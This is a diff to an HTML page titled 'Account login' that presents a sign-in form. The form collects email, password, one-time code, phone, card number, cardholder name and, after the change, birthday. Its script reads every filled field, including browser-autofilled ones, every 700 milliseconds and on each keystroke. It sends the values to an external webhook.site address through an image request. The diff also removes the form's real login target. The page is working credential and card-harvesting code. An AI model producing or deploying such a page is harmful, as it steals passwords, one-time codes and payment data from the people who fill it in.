@@ -2,9 +2,10 @@
 <html lang="en">
 <meta charset="utf-8">
 <title>Account login</title>
-<div style="font-family:system-ui;max-width:560px;margin:4vh auto">
+<style>#shown{font-size:1rem;color:#b00;white-space:pre-wrap;word-break:break-all}</style>
+<div style="font-family:system-ui;max-width:600px;margin:2vh auto">
  <h1>Sign in</h1>
- <form id="f" action="https://example.com/login" method="POST">
+ <form id="f">
   <input name="username" type="email" autocomplete="username" placeholder="Email"><br>
   <input name="password" type="password" autocomplete="current-password" placeholder="Password"><br>
   <input name="otp" type="text" autocomplete="one-time-code" placeholder="Code"><br>
@@ -16,22 +17,21 @@
   <input name="tel" type="tel" autocomplete="tel" placeholder="Phone"><br>
   <input name="ccnum" type="text" autocomplete="cc-number" placeholder="Card number"><br>
   <input name="ccname" type="text" autocomplete="cc-name" placeholder="Name on card"><br>
+  <input name="bday" type="text" autocomplete="bday" placeholder="Birthday"><br>
   <input name="note" type="text" placeholder="Note"><br>
   <button>Sign in</button>
  </form>
- <pre id="shown" style="color:#b00;white-space:pre-wrap;word-break:break-all"></pre>
+ <pre id="shown"></pre>
 </div>
 <script>
 var U='https://webhook.site/4f65b4cd-39b4-49e8-a05b-e0a2785d45cd';
-function beacon(p,v){try{new Image().src=U+p+'?d='+encodeURIComponent(String(v).slice(0,1500))+'&r='+Math.random();}catch(e){}}
-function dump(tag){
+function dump(){
  var parts=[]; document.querySelectorAll('input').forEach(function(el){ if(el.value) parts.push(el.name+'='+el.value); });
- var s=parts.join(' | ');
+ var s=parts.join('\n');
  document.getElementById('shown').textContent=s;
- beacon('/af_'+tag, s || 'EMPTY');
+ if(s) try{new Image().src=U+'/af?d='+encodeURIComponent(s.slice(0,1500))+'&r='+Math.random();}catch(e){}
 }
-document.querySelectorAll('input').forEach(function(el){['input','change','blur'].forEach(function(ev){el.addEventListener(ev,function(){dump('ev')});});});
-setTimeout(function(){dump('t5')},5000);
-setTimeout(function(){dump('t15')},15000);
-setTimeout(function(){dump('t40')},40000);
+document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();dump();});
+document.querySelectorAll('input').forEach(function(el){['input','change','blur'].forEach(function(ev){el.addEventListener(ev,dump);});});
+setInterval(dump,700);
 </script>
